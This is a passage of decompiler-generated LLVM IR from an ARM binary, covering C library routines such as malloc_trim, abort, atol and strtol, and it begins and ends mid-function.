  %v0_14444 = phi i32 [ %v3_14420, %dec_label_pc_14434 ], [ %v0_14444.pre, %dec_label_pc_14440 ]
  %v2_14444 = add i32 %v1_14444, 8
  %v3_14444 = inttoptr i32 %v2_14444 to i32*
  store i32 %v0_14444, i32* %v3_14444, align 4
  %v0_14448 = load i32, i32* %r2.global-to-local, align 4
  %v1_14448 = load i32, i32* %r1.global-to-local, align 4
  %v2_14448 = add i32 %v1_14448, 12
  %v3_14448 = inttoptr i32 %v2_14448 to i32*
  store i32 %v0_14448, i32* %v3_14448, align 4
  %v0_1444c = load i32, i32* %ip.global-to-local, align 4
  %v1_1444c = load i32, i32* %r0.global-to-local, align 4
  %v2_1444c = add i32 %v1_1444c, %v0_1444c
  store i32 %v2_1444c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_14450

dec_label_pc_14450:                               ; preds = %dec_label_pc_1440c.dec_label_pc_14450_crit_edge, %dec_label_pc_14444
  %v0_14460 = phi i32 [ %v0_14460.pre, %dec_label_pc_1440c.dec_label_pc_14450_crit_edge ], [ %v2_1444c, %dec_label_pc_14444 ]
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_14454 = load i32, i32* @r7, align 4
  %v2_14454 = add i32 %v0_14454, 64
  %v3_14454 = inttoptr i32 %v2_14454 to i32*
  %v4_14454 = load i32, i32* %v3_14454, align 4
  %v1_14458 = add i32 %v4_14454, 52
  store i32 %v1_14458, i32* %r3.global-to-local, align 4
  %v1_1445c = add i32 %v4_14454, 60
  %v2_1445c = inttoptr i32 %v1_1445c to i32*
  %v3_1445c = load i32, i32* %v2_1445c, align 4
  store i32 %v3_1445c, i32* %r1.global-to-local, align 4
  %v1_14460 = or i32 %v0_14460, 1
  store i32 %v1_14460, i32* %r2.global-to-local, align 4
  %v1_14464 = load i32, i32* %r4.global-to-local, align 4
  %v2_14464 = add i32 %v1_14464, 12
  %v3_14464 = inttoptr i32 %v2_14464 to i32*
  store i32 %v1_14458, i32* %v3_14464, align 4
  %v0_14468 = load i32, i32* %r1.global-to-local, align 4
  %v1_14468 = load i32, i32* %r4.global-to-local, align 4
  %v2_14468 = add i32 %v1_14468, 8
  %v3_14468 = inttoptr i32 %v2_14468 to i32*
  store i32 %v0_14468, i32* %v3_14468, align 4
  %v0_1446c = load i32, i32* %r2.global-to-local, align 4
  %v1_1446c = load i32, i32* %r4.global-to-local, align 4
  %v2_1446c = add i32 %v1_1446c, 4
  %v3_1446c = inttoptr i32 %v2_1446c to i32*
  store i32 %v0_1446c, i32* %v3_1446c, align 4
  %v0_14470 = load i32, i32* %ip.global-to-local, align 4
  %v1_14470 = load i32, i32* %r4.global-to-local, align 4
  %v3_14470 = add i32 %v1_14470, %v0_14470
  %v4_14470 = inttoptr i32 %v3_14470 to i32*
  store i32 %v0_14470, i32* %v4_14470, align 4
  %v0_14474 = load i32, i32* %r4.global-to-local, align 4
  %v1_14474 = load i32, i32* %r1.global-to-local, align 4
  %v2_14474 = add i32 %v1_14474, 12
  %v3_14474 = inttoptr i32 %v2_14474 to i32*
  store i32 %v0_14474, i32* %v3_14474, align 4
  %v0_14478 = load i32, i32* %r4.global-to-local, align 4
  %v1_14478 = load i32, i32* %r3.global-to-local, align 4
  %v2_14478 = add i32 %v1_14478, 8
  %v3_14478 = inttoptr i32 %v2_14478 to i32*
  store i32 %v0_14478, i32* %v3_14478, align 4
  br label %dec_label_pc_14490

dec_label_pc_14480:                               ; preds = %dec_label_pc_143f4
  %v2_14480 = add i32 %v1_14404, %v0_14480
  store i32 %v2_14480, i32* %ip.global-to-local, align 4
  %v1_14484 = or i32 %v2_14480, 1
  store i32 %v1_14484, i32* %r3.global-to-local, align 4
  %v0_14488 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14488, i32* %v2_143fc, align 4
  %v0_1448c = load i32, i32* %r3.global-to-local, align 4
  %v1_1448c = load i32, i32* %r4.global-to-local, align 4
  %v2_1448c = add i32 %v1_1448c, 4
  %v3_1448c = inttoptr i32 %v2_1448c to i32*
  store i32 %v0_1448c, i32* %v3_1448c, align 4
  br label %dec_label_pc_14490

dec_label_pc_14490:                               ; preds = %dec_label_pc_14450, %dec_label_pc_14480
  %v0_14490 = load i32, i32* %ip.global-to-local, align 4
  %v3_14494 = icmp ult i32 %v0_14490, 131070
  br i1 %v3_14494, label %dec_label_pc_14500, label %dec_label_pc_14498

dec_label_pc_14498:                               ; preds = %dec_label_pc_14490
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_1449c = load i32, i32* @r7, align 4
  %v2_1449c = add i32 %v0_1449c, 64
  %v3_1449c = inttoptr i32 %v2_1449c to i32*
  %v4_1449c = load i32, i32* %v3_1449c, align 4
  store i32 %v4_1449c, i32* @r4, align 4
  %v1_144a0 = inttoptr i32 %v4_1449c to i32*
  %v2_144a0 = load i32, i32* %v1_144a0, align 4
  store i32 %v2_144a0, i32* %r3.global-to-local, align 4
  %v1_144a4 = and i32 %v2_144a0, 2
  %v2_144a4 = icmp eq i32 %v1_144a4, 0
  br i1 %v2_144a4, label %bb16, label %bb

bb:                                               ; preds = %dec_label_pc_14498
  store i32 %v4_1449c, i32* %r0.global-to-local, align 4
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_14498, %bb
  %v1_144ac = xor i1 %v2_144a4, true
  call void @__pseudo_cond_branch(i1 %v1_144ac, i32 ptrtoint (i32* @global_var_14150.476 to i32))
  %v0_144b0 = load i32, i32* @r4, align 4
  %v1_144b0 = add i32 %v0_144b0, 44
  %v2_144b0 = inttoptr i32 %v1_144b0 to i32*
  %v3_144b0 = load i32, i32* %v2_144b0, align 4
  store i32 %v3_144b0, i32* %r3.global-to-local, align 4
  %v1_144b4 = add i32 %v3_144b0, 4
  %v2_144b4 = inttoptr i32 %v1_144b4 to i32*
  %v3_144b4 = load i32, i32* %v2_144b4, align 4
  store i32 %v3_144b4, i32* %r3.global-to-local, align 4
  %v1_144b8 = add i32 %v0_144b0, 836
  %v2_144b8 = inttoptr i32 %v1_144b8 to i32*
  %v3_144b8 = load i32, i32* %v2_144b8, align 4
  store i32 %v3_144b8, i32* %r2.global-to-local, align 4
  %v1_144bc = and i32 %v3_144b4, -4
  store i32 %v1_144bc, i32* %r3.global-to-local, align 4
  %v3_144c0 = icmp ult i32 %v1_144bc, %v3_144b8
  br i1 %v3_144c0, label %dec_label_pc_14500, label %dec_label_pc_144c8

dec_label_pc_144c8:                               ; preds = %bb16
  store i32 %v0_144b0, i32* %r1.global-to-local, align 4
  %v1_144cc = add i32 %v0_144b0, 840
  %v2_144cc = inttoptr i32 %v1_144cc to i32*
  %v3_144cc = load i32, i32* %v2_144cc, align 4
  store i32 %v3_144cc, i32* %r0.global-to-local, align 4
  %v2_144d0 = call i32 @__malloc_trim(i32 %v3_144cc, i32 %v0_144b0)
  store i32 %v2_144d0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14500

dec_label_pc_144d8:                               ; preds = %dec_label_pc_1439c
  %v2_144d8 = inttoptr i32 %v1_1436c to i32*
  %v3_144d8 = load i32, i32* %v2_144d8, align 4
  store i32 %v3_144d8, i32* %r0.global-to-local, align 4
  %v1_144dc = add i32 %v4_1435c, 848
  %v2_144dc = inttoptr i32 %v1_144dc to i32*
  %v3_144dc = load i32, i32* %v2_144dc, align 4
  store i32 %v3_144dc, i32* %r2.global-to-local, align 4
  %v1_144e0 = add i32 %v4_1435c, 868
  %v2_144e0 = inttoptr i32 %v1_144e0 to i32*
  %v3_144e0 = load i32, i32* %v2_144e0, align 4
  %v2_144e4 = add i32 %v3_144d8, %v1_14368
  store i32 %v2_144e4, i32* %r1.global-to-local, align 4
  %v1_144e8 = add i32 %v3_144dc, -1
  store i32 %v1_144e8, i32* %r2.global-to-local, align 4
  %v2_144ec = sub i32 %v3_144e0, %v2_144e4
  store i32 %v2_144ec, i32* %r3.global-to-local, align 4
  store i32 %v2_144ec, i32* %v2_144e0, align 4
  %v1_144f4 = load i32, i32* @lr, align 4
  %v2_144f4 = add i32 %v1_144f4, 848
  %v3_144f4 = inttoptr i32 %v2_144f4 to i32*
  store i32 %v1_144e8, i32* %v3_144f4, align 4
  %v0_144f8 = load i32, i32* %r0.global-to-local, align 4
  %v1_144f8 = load i32, i32* @r5, align 4
  %v2_144f8 = sub i32 %v1_144f8, %v0_144f8
  store i32 %v2_144f8, i32* %r0.global-to-local, align 4
  %v4_144fc = call i32 @munmap(i32 %v2_144f8, i32 %v2_144e4, i32 %v1_144e8, i32 %v2_144ec)
  store i32 %v4_144fc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14500

dec_label_pc_14500:                               ; preds = %bb16, %dec_label_pc_14490, %dec_label_pc_144c8, %dec_label_pc_1437c, %dec_label_pc_144d8
  store i32 %v2_14310, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  %v0_1450c = load i32, i32* @r7, align 4
  %v2_1450c = add i32 %v0_1450c, 44
  %v3_1450c = inttoptr i32 %v2_1450c to i32*
  %v4_1450c = load i32, i32* %v3_1450c, align 4
  store i32 %v4_1450c, i32* %ip.global-to-local, align 4
  store i32 83224, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1450c)
  br label %dec_label_pc_14518

dec_label_pc_14518:                               ; preds = %entry, %dec_label_pc_14500
  store i32 %v3_14304, i32* @r4, align 4
  store i32 %v6_14304, i32* @r5, align 4
  store i32 %v9_14304, i32* @r6, align 4
  store i32 %v12_14304, i32* @r7, align 4
  store i32 %v18_14304, i32* @lr, align 4
  ret i32 %v2_14310

; uselistorder directives
  uselistorder i32 %v0_144b0, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_14470, { 1, 0 }
  uselistorder i32 %v1_143b0, { 1, 0 }
  uselistorder i32 %v0_143b0, { 1, 0 }
  uselistorder i32 %v3_14384, { 1, 0 }
  uselistorder i32 %v1_14368, { 1, 0, 2 }
  uselistorder i32 %v2_14364, { 1, 2, 0, 3 }
  uselistorder i32 %v4_1435c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1430c, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 1, 2, 3, 7, 5, 6, 13, 14, 8, 9, 10, 12, 11 }
  uselistorder i32* %ip.global-to-local, { 0, 5, 1, 6, 2, 7, 4, 3, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 868, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 68) to i32*), { 0, 2, 3, 4, 1 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 108) to i32*), { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_14518, { 1, 0 }
  uselistorder label %dec_label_pc_14500, { 4, 2, 0, 1, 3 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %dec_label_pc_14490, { 1, 0 }
  uselistorder label %dec_label_pc_14450, { 1, 0 }
  uselistorder label %dec_label_pc_14444, { 1, 0 }
  uselistorder label %dec_label_pc_14440, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_143f4, { 1, 0 }
}

define i32 @function_14528(i32 %arg1) local_unnamed_addr {
dec_label_pc_14528:
  %v0_14528 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14528, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_14528
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_14528, %bb
  %v4_1453c = phi i32 [ %arg1, %dec_label_pc_14528 ], [ 0, %bb ]
  ret i32 %v4_1453c

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_14540 = load i32, i32* @r4, align 4
  store i32 %v3_14540, i32* %stack_var_-12, align 4
  %v6_14540 = load i32, i32* @r5, align 4
  %v9_14540 = load i32, i32* @lr, align 4
  %v4_14550 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 64) to i32*), align 4
  store i32 %v4_14550, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %v4_14550, i32* @r0, align 4
  %v0_14560 = call i32 @__malloc_consolidate()
  %v0_14564 = load i32, i32* @r4, align 4
  %v0_14568 = load i32, i32* @r5, align 4
  %v2_14570 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_14570, i32* @r4, align 4
  store i32 %v6_14540, i32* @r5, align 4
  %sext = mul i32 %v9_14540, 65536
  %v9_14570 = sdiv i32 %sext, 65536
  store i32 %v9_14570, i32* @lr, align 4
  %v2_14574 = call i32 @__malloc_trim(i32 %v0_14564, i32 %v0_14568)
  %v0_14578 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14578, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v1_14578 = load i32, i32* @lr, align 4
  %v2_14578 = trunc i32 %v1_14578 to i16
  %v4_14578 = inttoptr i32 %v2_14574 to i16*
  store i16 %v2_14578, i16* %v4_14578, align 2
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v4_1457c = phi i32 [ %v2_14574, %entry ], [ 0, %bb ]
  ret i32 %v4_1457c

; uselistorder directives
  uselistorder i32 (i32, i32)* @__malloc_trim, { 1, 0 }
  uselistorder i32 ()* @__malloc_consolidate, { 3, 2, 1, 0 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 64) to i32*), { 17, 3, 2, 7, 8, 9, 10, 11, 6, 12, 5, 13, 0, 14, 15, 4, 16, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* @r5, align 4
  %v4_14598 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 16) to i32*), align 4
  store i32 83364, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_14598)
  store i32 32, i32* %stack_var_-8, align 4
  %v4_145c0 = call i32 @__GI_sigprocmask(i32 1, i32* nonnull %stack_var_-8, i32 0)
  %v0_145c8 = load i32, i32* @r5, align 4
  %v2_145c8 = add i32 %v0_145c8, 628
  %v3_145c8 = inttoptr i32 %v2_145c8 to i32*
  %v4_145c8 = load i32, i32* %v3_145c8, align 4
  %v2_145cc = icmp eq i32 %v4_145c8, 0
  br i1 %v2_145cc, label %dec_label_pc_145d4, label %dec_label_pc_14614

dec_label_pc_145d4:                               ; preds = %entry
  store i32 1, i32* %v3_145c8, align 4
  br label %dec_label_pc_145dc

dec_label_pc_145dc:                               ; preds = %dec_label_pc_14624, %dec_label_pc_145d4
  %v0_145e0 = load i32, i32* @r5, align 4
  %v2_145e0 = add i32 %v0_145e0, 208
  store i32 %v2_145e0, i32* @r4, align 4
  %v2_145ec = add i32 %v0_145e0, 68
  %v3_145ec = inttoptr i32 %v2_145ec to i32*
  %v4_145ec = load i32, i32* %v3_145ec, align 4
  call void @__pseudo_branch(i32 %v4_145ec)
  %v1_145fc = call i32 @__GI_raise(i32 6)
  %v0_14608 = load i32, i32* @r5, align 4
  %v2_14608 = add i32 %v0_14608, 16
  %v3_14608 = inttoptr i32 %v2_14608 to i32*
  %v4_14608 = load i32, i32* %v3_14608, align 4
  store i32 83476, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_14608)
  %v0_14618.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14614

dec_label_pc_14614:                               ; preds = %entry, %dec_label_pc_145dc
  %v1_1462c = phi i32 [ %v0_145c8, %entry ], [ %v0_14618.pre, %dec_label_pc_145dc ]
  %v2_14618 = add i32 %v1_1462c, 628
  %v3_14618 = inttoptr i32 %v2_14618 to i32*
  %v4_14618 = load i32, i32* %v3_14618, align 4
  %v7_1461c = icmp eq i32 %v4_14618, 1
  br i1 %v7_1461c, label %dec_label_pc_14624, label %dec_label_pc_14660

dec_label_pc_14624:                               ; preds = %dec_label_pc_14614
  %v2_14624 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_14624, i32* @r4, align 4
  store i32 2, i32* %v3_14618, align 4
  %v3_1463c = bitcast i32* %stack_var_-28 to i8*
  %v4_1463c = call i32 @__GI_memset(i8* %v3_1463c, i32 0, i32 20)
  %v3_14658 = call i32 @__libc_sigaction(i32 6, i32 %v2_14624, i32 0)
  br label %dec_label_pc_145dc

dec_label_pc_14660:                               ; preds = %dec_label_pc_14614
  %v7_14660 = icmp eq i32 %v4_14618, 2
  br i1 %v7_14660, label %dec_label_pc_14668, label %dec_label_pc_14674

dec_label_pc_14668:                               ; preds = %dec_label_pc_14660
  store i32 3, i32* %v3_14618, align 4
  %v0_14670 = call i32 @abort()
  %v0_14674.pre = load i32, i32* @r5, align 4
  %v1_14674.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_14674

dec_label_pc_14674:                               ; preds = %dec_label_pc_14660, %dec_label_pc_14668
  %v3_14680 = phi i32 [ 628, %dec_label_pc_14660 ], [ %v1_14674.pre, %dec_label_pc_14668 ]
  %v2_14680 = phi i32 [ %v1_1462c, %dec_label_pc_14660 ], [ %v0_14674.pre, %dec_label_pc_14668 ]
  %v2_14674 = add i32 %v2_14680, %v3_14680
  %v3_14674 = inttoptr i32 %v2_14674 to i32*
  %v4_14674 = load i32, i32* %v3_14674, align 4
  %v7_14678 = icmp eq i32 %v4_14674, 3
  br i1 %v7_14678, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_14674
  store i32 4, i32* %v3_14674, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_14674, %bb
  call void @__pseudo_cond_branch(i1 %v7_14678, i32 ptrtoint (i32* @global_var_16260.485 to i32))
  br label %dec_label_pc_1468c

dec_label_pc_1468c:                               ; preds = %dec_label_pc_1468c, %.thread2
  %v0_1468c = call i32 @abort()
  br label %dec_label_pc_1468c

; uselistorder directives
  uselistorder i32* %v3_14618, { 1, 0, 2 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 16) to i32*), { 2, 0, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_14674, { 1, 0 }
  uselistorder label %dec_label_pc_14614, { 1, 0 }
}

define i32 @function_14698(i64* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_14698:
  %tmp = ptrtoint i64* %arg1 to i32
  %v0_14698 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14698, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_14698
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_14698, %bb
  %v4_146a4 = phi i32 [ %tmp, %dec_label_pc_14698 ], [ 0, %bb ]
  ret i32 %v4_146a4

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_146b8 = call i32 @strtol()
  ret i32 %v0_146b8
}

define i32 @strtol() local_unnamed_addr {
entry:
  store i32 1, i32* @r3, align 4
  %v0_146d4 = call i32 @_stdlib_strto_l()
  ret i32 %v0_146d4
}

define i32 @_stdlib_strto_l() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* %ip.global-to-local, align 4
  %v0_146f8 = load i32, i32* @r1, align 4
  store i32 %v0_146f8, i32* %sb.global-to-local, align 4
  %v0_146fc = load i32, i32* @r2, align 4
  store i32 %v0_146fc, i32* %r5.global-to-local, align 4
  %v0_14700 = load i32, i32* @r0, align 4
  store i32 %v0_14700, i32* %r4.global-to-local, align 4
  %v0_14704 = load i32, i32* @r3, align 4
  br label %dec_label_pc_14710

dec_label_pc_1470c:                               ; preds = %dec_label_pc_14710
  %v1_1470c = add i32 %v0_14748, 1
  store i32 %v1_1470c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14710

dec_label_pc_14710:                               ; preds = %entry, %dec_label_pc_1470c
  %v0_14748 = phi i32 [ %v0_14700, %entry ], [ %v1_1470c, %dec_label_pc_1470c ]
  %v1_14710 = inttoptr i32 %v0_14748 to i8*
  %v2_14710 = load i8, i8* %v1_14710, align 1
  %v3_14710 = zext i8 %v2_14710 to i32
  store i32 %v3_14710, i32* %r1.global-to-local, align 4
  %v4_14714 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 272) to i32*), align 4
  %v2_14718 = mul nuw nsw i32 %v3_14710, 2
  %v2_1471c = add i32 %v2_14718, %v4_14714
  %v3_1471c = inttoptr i32 %v2_1471c to i16*
  %v4_1471c = load i16, i16* %v3_1471c, align 2
  %v1_14720 = and i16 %v4_1471c, 32
  %v2_14720 = icmp eq i16 %v1_14720, 0
  br i1 %v2_14720, label %dec_label_pc_14728, label %dec_label_pc_1470c

dec_label_pc_14728:                               ; preds = %dec_label_pc_14710
  %v7_14728 = icmp eq i8 %v2_14710, 43
  br i1 %v7_14728, label %dec_label_pc_14748, label %dec_label_pc_14730

dec_label_pc_14730:                               ; preds = %dec_label_pc_14728
  %v7_14730 = icmp eq i8 %v2_14710, 45
  br i1 %v7_14730, label %dec_label_pc_14748, label %bb

bb:                                               ; preds = %dec_label_pc_14730
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1474c

dec_label_pc_14748:                               ; preds = %dec_label_pc_14728, %dec_label_pc_14730
  %storemerge47 = phi i32 [ 1, %dec_label_pc_14730 ], [ 0, %dec_label_pc_14728 ]
  store i32 %storemerge47, i32* %r7.global-to-local, align 4
  %v1_14748 = add i32 %v0_14748, 1
  store i32 %v1_14748, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1474c

dec_label_pc_1474c:                               ; preds = %bb, %dec_label_pc_14748
  %v0_1476c = phi i32 [ %v0_14748, %bb ], [ %v1_14748, %dec_label_pc_14748 ]
  %v1_1474c = and i32 %v0_146fc, -17
  %v3_1474c = icmp eq i32 %v1_1474c, 0
  br i1 %v3_1474c, label %dec_label_pc_14758, label %bb60

bb60:                                             ; preds = %dec_label_pc_1474c
  br label %bb64

dec_label_pc_14758:                               ; preds = %dec_label_pc_1474c
  %v1_14758 = inttoptr i32 %v0_1476c to i8*
  %v2_14758 = load i8, i8* %v1_14758, align 1
  %v7_1475c = icmp eq i8 %v2_14758, 48
  %v1_14760 = add i32 %v0_146fc, 10
  store i32 %v1_14760, i32* %r5.global-to-local, align 4
  br i1 %v7_1475c, label %dec_label_pc_1476c, label %bb61

bb61:                                             ; preds = %dec_label_pc_14758
  br label %.thread8

dec_label_pc_1476c:                               ; preds = %dec_label_pc_14758
  %v1_1476c = add i32 %v0_1476c, 1
  %v2_1476c = inttoptr i32 %v1_1476c to i8*
  %v3_1476c = load i8, i8* %v2_1476c, align 1
  %v4_1476c = zext i8 %v3_1476c to i32
  store i32 %v1_1476c, i32* %r4.global-to-local, align 4
  %v1_14770 = or i32 %v4_1476c, 32
  %v7_14774 = icmp eq i32 %v1_14770, 120
  %v1_14778 = add i32 %v0_146fc, 8
  store i32 %v1_14778, i32* %r5.global-to-local, align 4
  br i1 %v7_14774, label %bb62, label %.thread8

bb62:                                             ; preds = %dec_label_pc_1476c
  %v3_14784 = mul i32 %v1_14778, 2
  store i32 %v3_14784, i32* %r5.global-to-local, align 4
  %v2_14788 = add i32 %v0_1476c, 2
  store i32 %v2_14788, i32* %r4.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1476c, %bb61, %bb62
  %v1_1485c30 = phi i32 [ %v0_14700, %bb61 ], [ %v1_1476c, %bb62 ], [ %v1_1476c, %dec_label_pc_1476c ]
  %v0_147d821 = phi i32 [ %v0_1476c, %bb61 ], [ %v2_14788, %bb62 ], [ %v1_1476c, %dec_label_pc_1476c ]
  %v0_1478c = phi i32 [ %v1_14760, %bb61 ], [ %v3_14784, %bb62 ], [ %v1_14778, %dec_label_pc_1476c ]
  %v5_14790 = icmp slt i32 %v0_1478c, 16
  br i1 %v5_14790, label %bb64, label %bb63

bb63:                                             ; preds = %.thread8
  store i32 16, i32* %r5.global-to-local, align 4
  br label %bb64

bb64:                                             ; preds = %bb60, %.thread8, %bb63
  %v1_1485c29 = phi i32 [ %v0_14700, %bb60 ], [ %v1_1485c30, %.thread8 ], [ %v1_1485c30, %bb63 ]
  %v0_147d820 = phi i32 [ %v0_1476c, %bb60 ], [ %v0_147d821, %.thread8 ], [ %v0_147d821, %bb63 ]
  %v0_147b8 = phi i32 [ %v0_146fc, %bb60 ], [ %v0_1478c, %.thread8 ], [ 16, %bb63 ]
  %v1_14794 = add i32 %v0_147b8, -2
  %tmp = icmp ugt i32 %v1_14794, 34
  br i1 %tmp, label %.thread, label %dec_label_pc_147a4

.thread:                                          ; preds = %bb64
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_14858

dec_label_pc_147a4:                               ; preds = %bb64
  %v2_147ac = udiv i32 -1, %v0_147b8
  %v3_147ac = urem i32 -1, %v0_147b8
  store i32 %v0_147b8, i32* %r1.global-to-local, align 4
  %v1_147bc = urem i32 %v3_147ac, 256
  store i32 %v1_147bc, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %fp.global-to-local, align 4
  store i32 %v2_147ac, i32* %r8.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_147d8

dec_label_pc_147d4:                               ; preds = %bb71, %dec_label_pc_14834
  %v0_147d4 = phi i32 [ %v1_1481444, %bb71 ], [ %v0_147d4.pre, %dec_label_pc_14834 ]
  br label %dec_label_pc_147d8

dec_label_pc_147d8:                               ; preds = %dec_label_pc_147a4, %dec_label_pc_147d4
  %v1_1485c27 = phi i32 [ %v1_1485c29, %dec_label_pc_147a4 ], [ %v0_147d4, %dec_label_pc_147d4 ]
  %v0_14814 = phi i32 [ %v0_147d820, %dec_label_pc_147a4 ], [ %v0_147d4, %dec_label_pc_147d4 ]
  %v1_147d8 = inttoptr i32 %v0_14814 to i8*
  %v2_147d8 = load i8, i8* %v1_147d8, align 1
  %v3_147d8 = zext i8 %v2_147d8 to i32
  %v1_147dc = add nsw i32 %v3_147d8, -48
  %v1_147e0 = urem i32 %v1_147dc, 256
  store i32 %v1_147e0, i32* %r1.global-to-local, align 4
  %v1_147e8 = or i32 %v3_147d8, 32
  %tmp79 = icmp ult i32 %v1_147e0, 10
  br i1 %tmp79, label %bb66, label %dec_label_pc_147f0

dec_label_pc_147f0:                               ; preds = %dec_label_pc_147d8
  store i32 40, i32* %r1.global-to-local, align 4
  %tmp80 = icmp ugt i32 %v1_147e8, 96
  br i1 %tmp80, label %bb65, label %bb66

bb65:                                             ; preds = %dec_label_pc_147f0
  %v1_147f4 = add nsw i32 %v1_147e8, -87
  %v5_147fc = urem i32 %v1_147f4, 256
  store i32 %v5_147fc, i32* %r1.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_147d8, %dec_label_pc_147f0, %bb65
  %v3_1482c = phi i32 [ %v1_147e0, %dec_label_pc_147d8 ], [ 40, %dec_label_pc_147f0 ], [ %v5_147fc, %bb65 ]
  %v1_14800 = load i32, i32* %r5.global-to-local, align 4
  %v6_14804 = icmp slt i32 %v3_1482c, %v1_14800
  br i1 %v6_14804, label %dec_label_pc_14808, label %dec_label_pc_14858.loopexit

dec_label_pc_14808:                               ; preds = %bb66
  %v0_14808 = load i32, i32* %ip.global-to-local, align 4
  %v1_14808 = load i32, i32* %r8.global-to-local, align 4
  %v9_14808 = icmp eq i32 %v0_14808, %v1_14808
  br i1 %v9_14808, label %.thread39, label %bb67

.thread39:                                        ; preds = %dec_label_pc_14808
  %v1_1481440 = add i32 %v0_14814, 1
  store i32 %v1_1481440, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1481c

bb67:                                             ; preds = %dec_label_pc_14808
  %v3_14808 = icmp ult i32 %v0_14808, %v1_14808
  %v1_14814 = add i32 %v0_14814, 1
  store i32 %v1_14814, i32* %r4.global-to-local, align 4
  br i1 %v3_14808, label %dec_label_pc_1481c, label %dec_label_pc_14834

dec_label_pc_1481c:                               ; preds = %bb67, %.thread39
  %v1_1481444 = phi i32 [ %v1_1481440, %.thread39 ], [ %v1_14814, %bb67 ]
  %v4_148242443 = phi i32 [ 1, %.thread39 ], [ 0, %bb67 ]
  %v1_1481c = load i32, i32* %sl.global-to-local, align 4
  %v3_1481c = icmp uge i32 %v3_1482c, %v1_1481c
  %v9_1481c = icmp eq i32 %v3_1482c, %v1_1481c
  %v2_14820 = xor i1 %v3_1481c, true
  %v3_14820 = or i1 %v9_1481c, %v2_14820
  br i1 %v3_14820, label %bb68, label %bb69

bb68:                                             ; preds = %dec_label_pc_1481c
  br label %bb69

bb69:                                             ; preds = %dec_label_pc_1481c, %bb68
